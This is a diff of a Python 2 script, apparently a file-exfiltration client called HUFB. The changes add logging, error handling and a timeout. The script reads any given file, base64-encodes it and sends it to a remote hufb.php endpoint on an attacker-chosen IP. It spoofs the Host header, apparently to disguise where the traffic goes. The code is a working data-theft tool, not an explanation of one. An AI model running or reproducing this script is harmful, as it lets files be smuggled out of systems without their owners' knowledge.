@@ -6,35 +6,40 @@ import sys
 import base64
 import argparse
 from urllib2 import Request, urlopen, URLError
-#from websocket import create_connection
 
 # Main function
 def main(ip,host,file):
 	content = ''
-	for line in open(file):
-		content = content + line
+	try:
+		print "[*] Reading file - %s" % file
+		for line in open(file):
+			content = content + line
+	except:
+		print "[!] Error opening/reading file"
+		sys.exit()
 	encoded = base64.b64encode(b'%s' % content)
+	print "[*] Data encoded"
 
 	ip_req = 'http://' + ip + '/hufb/hufb.php?content=' + encoded
-
+	print "[*] Sending request"
 	req = urllib2.Request(ip_req)
 	req.add_header('Host', host)
 	req.add_header('User-agent','HUFB')
 
 	try:
-		res = urllib2.urlopen(req)
+		res = urllib2.urlopen(req,timeout=5)
 		html = res.read()
-		print html
+		print "[*] Response received - %s" % html
 
 	except URLError, e:
 		if hasattr(e, 'reason'):
-        		print 'We failed to reach a server.'
-       			print 'Reason: ', e.reason
-			print e 
+        		print '[!] We failed to reach a server.'
+       			print '[!] Reason: ', e.reason
+			print '[!] Error Msg: %s' % e 
     		elif hasattr(e, 'code'):
-        		print 'The server couldn\'t fulfill the request.'
-        		print 'Error code: ', e.code
-			print e
+        		print '[!] The server couldn\'t fulfill the request.'
+        		print '[!] Error code: ', e.code
+			print '[!] Error Msg: %s' % e
 
 # Start here
 if __name__ == "__main__":
